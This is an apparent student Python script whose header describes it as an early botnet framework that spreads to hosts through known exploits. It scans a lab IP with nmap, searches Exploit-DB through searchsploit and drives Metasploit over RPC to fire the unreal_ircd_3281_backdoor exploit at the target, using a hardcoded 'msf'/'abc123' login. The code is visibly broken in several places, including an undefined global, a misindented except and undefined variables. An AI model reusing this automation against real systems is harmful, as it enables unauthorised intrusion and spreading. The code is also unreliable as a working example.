#!/usr/bin/python3
# -*- coding: utf-8 -*- 
#
#----------------------------------------------------
#
#Author: Burtonyaboy
#Date: 7-6-2018
#
#This project is the result of a paper one of my 
#professors wrote. The goal is to design an electronic
#warfare system using blackboard architecture for
#decision making. The end product will look like a
#heavyweight botnet framework capable of spreading to 
#hosts with known and readily available exploits.
#
#----------------------------------------------------
import subprocess, os, sys, json, random, time
import msgpack, http.client

#global variables to be later changed to user input
hosts = ['192.168.56.3']
intensity = 'Loud'
iface = 'vboxnet0'

#global variables for debugging
#some things don't need to be run every time for testing:
nmap_debug = 0
search_debug = 0
post_debug = 1

#msf needs its own special directory
msf_exploit_dir = '/root/.msf4/modules/exploits/private/'

#host object holds information about a target
class Host:

    def __init__(self, ip_addr, hostname):
        self.ip_addr = ip_addr
        self.open_ports = {}
        self.hostname = hostname
        self.scanxml = hostname + '.xml'
        self.exploits_file = hostname + '.json'
        self.exploits = []
        self.host.session = None

#pythons msfrpc is garbage and pymsfrpc wont import --_(*_*)_--
class Msfrpc:
    def __init__(self,opts=[]):
        self.host = "127.0.0.1"
        self.port = 55552
        self.token = False
        self.auth = False
        self.client = http.client.HTTPConnection(self.host,self.port)
        self.console_id = ''

    def encode(self, data):
        return msgpack.packb(data)
    def decode(self,data):
        return msgpack.unpackb(data)

    def bytes_to_dict(self,bytes_dict):
        out = {}
        for attrib,value in bytes_dict.items():
            if type(value) is not bytes:
                out.update({attrib.decode('utf-8'):value})
            else:
                out.update({attrib.decode('utf-8'):value.decode('utf-8')})
        return out

    def returnOne(self):
        return 1

    def call(self,meth,opts=[]):
        if self.console_id:
            opts.insert(0,self.console_id)

        if meth != "auth.login":
            opts.insert(0,self.token)

        opts.insert(0,meth)
        params = self.encode(opts)
        self.client.request("POST","/api/",params,{"Content-type" : "binary/message-pack"})
        resp = self.client.getresponse()
        if meth == 'console.write':
            return c.wait()
        else:
            return self.bytes_to_dict(self.decode(resp.read()))

    def wait(self):
        res = c.call('console.read',[])
        print(res)
        if res['busy'] == False:
            time.sleep(3)
        while res['busy'] == True:
            time.sleep(1)
            res = c.call('console.read',[])
            print(res)
        return res

#has a flexible network scanner and parses data
#to format which is useful for metasploit
class NetworkScanner:

    def __init__(self):
        self.nmap_command = None
        self.options_list = {
            None: '-F',
            'Quiet' : '-sS -T3 -f',
            'Normal' : '-sV -T4 --script=banner',
            'Loud' : '-A -T5 --script=banner'
        }
        print('[+]Scanner initialized.')

    #main controller of the scanner
    def scan_network(self, host, options):
        #create command for nmap to execute
        self.nmap_command = ['nmap',self.options_list[options],str(host.ip_addr),'-oX',host.scanxml,'-e',iface]
        print('[*]' + self.nmap_command)
        #execute command and wait for it to finish
        if(not nmap_debug):
            self.nmap_process = subprocess.Popen(self.nmap_command, stdout=subprocess.PIPE)
            sys.stdout.flush()
            print(self.nmap_process.communicate())
        return 0

#use data to find a useful exploit
class DatabaseFind:

    def __init__(self):
        print('[+]Finder initialized.')

    def search_database(self, host):
        #use searchpsloit to query
        print('[+]Searching local exploit database')
        ssploit_cmd = 'searchsploit --nmap ' + str(host.scanxml) + ' --json'
        print('[*]' + ssploit_cmd)
        if(not search_debug):
            host.exploits = subprocess.check_output(ssploit_cmd.split()).decode('utf-8')
            sys.stdout.flush()
            with open(host.exploits_file, 'w') as fi:
                fi.write(str(host.exploits))
        self.output_to_json(host)
        self.choose_exploits(host)
        return 0

    #make the output into usable json
    def output_to_json(self, host):
        data_json = []
        #open the raw output file
        with open(host.exploits_file, 'r') as fi:
            #read the file minus the first two lines (they are garbage)
            data = '\n'.join(fi.read().splitlines()[2:])
            #each exploit is separated by 3 newline chars
            for exp in data.split('\n\n\n'):
                data_json.append(json.loads(exp))
        #now that we have a json object, loop through and add them
        #to exploits usable on the host
        for i in data_json: 
            if len(i['RESULTS_EXPLOIT']):
                for exp in i['RESULTS_EXPLOIT']:
                    if 'Metasploit' in exp['Title']: 
                        print('\n[*]EXPLOIT FOUND: ' + str(exp))
                        host.exploits.append(exp)

    def choose_exploits(self, host):
        #pick the exploit to use
        #for now this will be hard-coded to use one exploit
        exploits = []
        exp_num = '16922'
        #make the directory if it doesn't exist
        if not (os.path.exists(msf_exploit_dir)):
            print('path not here!')
            os.makedirs(msf_exploit_dir)
        #mirror the exploit being used
        for exploit in host.exploits:
            if exploit['EDB-ID'] == exp_num:
                ssquery = "searchsploit -m " + exploit['EDB-ID']
                ssproc = subprocess.Popen(
                    ssquery.split(),
                    stdout = subprocess.PIPE)
                sys.stdout.flush()
                ssproc.communicate()
                #grab the ID of the exploit
                #msf updated so now most of these don't work
                #the ID can be used to find an equivalent exploit 
                with open(exp_num + '.rb', 'r') as file:
                    exploit = file.readlines()
                exploits.append(exploit[1].split()[2].split('.')[0])
                subprocess.call(['rm', exp_num + '.rb'])
        #override the old exploit data 
        host.exploits = exploits

class Exploit:

    def __init__(self):
        #we need a password for the msfrpc daemon
        #dont want to hardcode so we will make it random
        self.msf_usr = 'msf'
        self.msf_pass = ''
        chars = 'abcdefghijklmnopqrytuvwxyzABCDEFGHIJKLMNOPQRYTUVWXYZ1234567890'
        password_length = 8
        r = random.SystemRandom()
        self.msf_pass = ''.join([r.choice(chars) for i in range(password_length)])
        msfrpcd_init_cmd = ["msfconsole","-x","'load msgrpc'"]
        subprocess.Popen(msfrpcd_init_cmd,shell=True,stdout=subprocess.PIPE)
        #login
        c = Msfrpc({})
        c.auth = c.call('auth.login',['msf','abc123'])
        print(c.auth)
        c.token = c.auth['token']
        c.console_id = c.call('console.create')['id']

    def exploit(self, host):
        #search for equivalent exploit
        try:
            print(c.console_id)
            c.call('console.read',[])
            search_res = c.call('console.write',['search unreal_ircd_3281_backdoor\n'])['data'].split()
            print(search_res)
            exp_path = [line.split()[0] for line in search_res if 'exploit' in line][0]
            c.call('console.write',['use '+exp_path+'\n'])
            c.call('console.write',['show options\n'])
            c.call('console.write',['set RHOST '+host.ip_addr+'\n'])
            c.call('console.write',['exploit\n'])
            c.call('console.destroy',[])
            print('done.')
    except Exception as e:
            print(e)
            c.call('console.destroy',[])
            exit(1)
        #output = subprocess.Popen(msf_cmd.split())
        #print(output)

class PostExploitation:

    def __init__(self):
        pass

    def load_files(self):
        pass

class HostController:

    def __init__(self, scanner, finder, exp, post_exp):
        #initialize hosts to carry out tasks
        self.scanner = scanner
        self.finder = finder
        self.exp = exp
        self.post_exp = post_exp
        print('[+]Controller created.')

    def exploit_target(self, host, options):
        self.scanner.scan_network(host, options)
        self.finder.search_database(host,)

        print('[+]The following services were found:')
        if(not post_debug):
            subprocess.Popen(['rm','-rf',msf_exploit_dir])

def console():
    #make sure user is root
    uid = os.getuid()
    print('[+]CONSOLE STARTED')
    if uid is not 0:
        print('[-]THIS PROGRAM REQUIRES ROOT PRIVILEGE')
        print('[-]YOUR UID IS: ' + str(uid))
        exit(1)

if __name__ == '__main__':
    #set everything up
    console()
    net_scan = NetworkScanner()
    data_search = DatabaseFind()
    exp = Exploit()
    post_exploit = PostExploitation()
    controller = HostController(net_scan, data_search, exp, post_exploit)
    #loop through hosts
    for ip in hosts:
        host = Host(ip, 'vulnerable')
        controller.exploit_target(host, options)
